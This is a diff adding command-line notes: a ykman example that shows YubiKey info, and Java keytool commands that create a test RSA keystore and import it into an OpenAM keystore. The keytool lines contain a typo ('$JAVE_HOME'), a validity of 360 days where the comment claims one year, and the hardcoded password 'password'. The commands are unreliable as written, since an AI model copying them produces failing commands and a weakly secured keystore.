+    Show information about YubiKey with serial number 0123456:
+    $ ykman --device 0123456 info
+
+
+
+
+
+
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+
+
+#Creates new key with 1 year validity
+$JAVE_HOME/jre/bin/keytool -genkey -keyalg RSA -alias my-test-cert -keystore my-test-cert.jks -storepass password -validity 360 -keysize 2048
+
+#Adds existing jks stored private key into the existing AM jcecks keystore so you can sign SAML2 assertions etc
+$JAVE_HOME/jre/bin/keytool -importkeystore -srckeystore my-test-cert.jks -destkeystore ~/am5/openam/keystore.jceks -storetype jceks
